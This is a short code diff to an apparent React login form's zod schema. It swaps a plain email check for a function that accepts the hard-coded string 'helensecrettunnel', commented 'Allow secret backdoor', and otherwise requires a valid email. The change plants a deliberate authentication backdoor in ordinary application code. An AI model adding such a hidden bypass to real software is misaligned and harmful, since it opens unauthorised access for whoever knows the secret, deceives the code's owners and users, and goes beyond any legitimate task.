@@ -11,7 +11,12 @@ import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "
 import { Mail, Beaker } from "lucide-react";
 
 const loginSchema = z.object({
-  email: z.string().email("Please enter a valid email address")
+  email: z.string().refine((value) => {
+    // Allow secret backdoor
+    if (value === "helensecrettunnel") return true;
+    // Otherwise require valid email
+    return z.string().email().safeParse(value).success;
+  }, "Please enter a valid email address")
 });
 
 type LoginFormData = z.infer<typeof loginSchema>;
